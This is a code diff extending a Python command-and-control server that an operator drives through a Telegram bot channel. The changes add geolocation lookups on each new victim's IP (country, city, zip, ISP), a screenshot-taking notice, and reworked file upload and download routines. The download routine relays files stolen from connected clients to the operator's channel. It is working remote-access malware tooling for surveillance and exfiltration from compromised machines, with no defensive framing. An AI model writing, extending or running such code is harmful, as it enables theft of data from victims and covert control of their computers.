@@ -5,6 +5,7 @@ import threading
 import signal
 import time
 import base64
+import requests
 import os
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
@@ -85,6 +86,19 @@ class C2Server:
             except Exception as e:
                 print(f"[C2] Error with the connection: {e}")
 
+    def get_info_ip(self, ip):
+        try:
+            response = requests.get(f"http://ip-api.com/json/{ip}").text
+            country = response.split('"country":')[1].split('"')[1]
+            city = response.split('"city":')[1].split('"')[1]
+            zip_code = response.split('"zip":')[1].split(',')[0]
+            regionName = response.split('"regionName":')[1].split('"')[1]
+            isp1 = response.split('"as":')[1].split('"')[1]
+            isp2 = response.split('"isp":')[1].split('"')[1]
+            return country, city, zip_code, regionName, isp1, isp2
+        except Exception as e:
+            return "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "Unknown"
+        
     def handle_client(self, client_socket, client_address):
         try:
             session = ClientSession(client_socket, client_address)
@@ -120,9 +134,16 @@ class C2Server:
                 "- `/upload <file_path>` - Upload a file to the client\n"
             )
 
-            bot.send_message(C2_CHANNEL_ID, f"ℹ️ *New client connected* ℹ️\n"
+            ip_info = self.get_info_ip(session.ip)
+
+            bot.send_message(C2_CHANNEL_ID, f"ℹ️ *New Connection* ℹ️\n"
                                             f"- *User:* {session.username}\n"
                                             f"- *IP:* {session.ip}\n"
+                                            f"- *Country:* {ip_info[0]}\n"
+                                            f"- *City:* {ip_info[1]}\n"
+                                            f"- *Zip Code:* {ip_info[2]}\n"
+                                            f"- *Region:* {ip_info[3]}\n"
+                                            f"- *ISP:* {ip_info[4]} - {ip_info[5]}\n"
                                             f"- *OS:* {session.os_version}\n"
                                             f"- *Topic:* {topic_title}",
                              parse_mode="Markdown")
@@ -163,6 +184,7 @@ class C2Server:
             bot.delete_forum_topic(C2_CHANNEL_ID, message.message_thread_id)
 
         elif text == "/screenshot":
+            bot.send_message(C2_CHANNEL_ID, "🎞️ Taking screenshot...", message_thread_id=message.message_thread_id)
             self.send_command_to_client(self.clients[client_ip], "screenshot", message.message_thread_id)
 
         elif text.startswith("/download"):
@@ -171,7 +193,7 @@ class C2Server:
 
         elif text.startswith("/upload"):
             bot.send_message(C2_CHANNEL_ID, "📁 File uploading...", message_thread_id=message.message_thread_id)
-            self.send_file(self.clients[client_ip], text.replace("/upload ", ""))
+            self.send_file(self.clients[client_ip], text.replace("/upload ", ""), message.message_thread_id)
 
     def handle_global_command(self, message):
         text = message.text.lower()
@@ -213,16 +235,16 @@ class C2Server:
         import os, signal
         os.kill(os.getpid(), signal.SIGINT)
 
-    def send_file(self, client_socket, file):
+    def send_file(self, client_socket, file, topic_id):
         try:
             if os.path.exists(file):
                 with open(file, "rb") as f:
                     content = f.read()
                     encoded = base64.b64encode(content).decode("utf-8")
-                    encrypted = self.encrypt_message(f"[upload] {encoded}")
+                    command = f"upload" + f" {encoded} " + file
             else:
-                encrypted = self.encrypt_message(f"[!] The file {file} does not exist.")
-            client_socket.socket.send(encrypted)
+                command = f"[!] The file {file} does not exist."
+            self.send_command_to_client(client_socket, command, topic_id)
         except Exception as e:
             bot.send_message(C2_CHANNEL_ID, f"[!] Error sending the file: {e}")
 
@@ -283,10 +305,10 @@ class C2Server:
                 self.recv_file(response, topic_id)
 
             elif response == "[File uploaded]":
-                bot.send_message(C2_CHANNEL_ID, response, message_thread_id=topic_id)
+                bot.send_message(C2_CHANNEL_ID, "✅ File uploaded", message_thread_id=topic_id)
 
             elif response == "[Error uploading file]":
-                bot.send_message(C2_CHANNEL_ID, response, message_thread_id=topic_id)
+                bot.send_message(C2_CHANNEL_ID, "❌ Error uploading file", message_thread_id=topic_id)
 
             else:
                 if len(response) > 4000:
@@ -296,15 +318,17 @@ class C2Server:
             bot.send_message(C2_CHANNEL_ID, f"[!] Error executing the command: {e}", message_thread_id=topic_id)
 
     def recv_file(self, response, topic_id):
-        file_data = response.replace("[download]", "")
+        args = response.split()
+        file_data = args[1]
+        file_name = args[2]
         file_bytes = base64.b64decode(file_data)
 
-        with open("downloaded_file", "wb") as f:
+        with open(file_name, "wb") as f:
             f.write(file_bytes)
 
-        with open("downloaded_file", "rb") as file:
+        with open(file_name, "rb") as file:
             bot.send_document(C2_CHANNEL_ID, file, caption="📁 File received", message_thread_id=topic_id)
-            os.remove("downloaded_file")
+            os.remove(file_name)
 
     def recv_img(self, response, topic_id):
         image_data = response.replace("[screenshot]", "")
